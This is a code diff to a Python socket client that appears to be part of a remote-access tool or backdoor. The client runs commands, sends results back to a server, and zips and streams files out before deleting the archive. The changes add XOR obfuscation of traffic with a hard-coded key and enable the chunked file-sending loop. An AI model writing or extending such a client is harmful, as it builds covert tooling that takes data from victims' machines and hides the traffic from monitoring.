@@ -1,6 +1,8 @@
 import socket
 import zipfile
 import os
+from itertools import cycle
+import base64
 
 DSIZE = 102400 # Data Size
 DELIMETER = "<END_OF_RESULTS>"
@@ -17,12 +19,14 @@ class ClientConnection:
         self.socket.connect((server_ip, server_port))
          
      def send_data(self, data):
-        self.bytedata = data.encode('utf-8')
+        self.bytedata = self.encryptDecrypt(data,encode=True)
+      #   self.bytedata = self.encryptDecrypt(data).encode('utf-8')
         self.socket.send(self.bytedata)
 
      def recv_data(self):
         self.bytedata = self.socket.recv(DSIZE)
         self.data = self.bytedata.decode('utf-8')
+        self.data = self.encryptDecrypt(self.data,decode=True)
         return self.data
                    
      def send_results(self, command_result):
@@ -68,19 +72,28 @@ class ClientConnection:
                 zip_content = file.read()
                 file.close()
                 
-         #  while True :
-         #        if zip_content == b'':
-         #           self.socket.send(b'<END_OF_RESULTS>')
-         #           break
-         #        self.socket.send(zip_content[:DSIZE])
-         #        print ("[+] Sending {DSIZE} Bytes")
-         #        zip_content=zip_content[DSIZE:]
+          while True :
+                if zip_content == b'':
+                   self.socket.send(b'<END_OF_RESULTS>')
+                   break
+                self.socket.send(zip_content[:DSIZE])
+               #  print ("[+] Sending {DSIZE} Bytes")
+                zip_content=zip_content[DSIZE:]
                           
          #  print("[+] Bytes Sent")
           
           bytes_to_send = zip_content+DELIMETER.encode()
           self.socket.send(bytes_to_send)
           os.remove(zipped_name)
+
+  
+     def encryptDecrypt(self,data, key = 'test', encode = False, decode = False):
+        
+        xored = ''.join(chr(ord(x) ^ ord(y)) for (x,y) in zip(data, cycle(key)))
+         
+        if encode:
+           return xored.encode('utf-8')
+        return xored
              
                
      def end_conn(self):
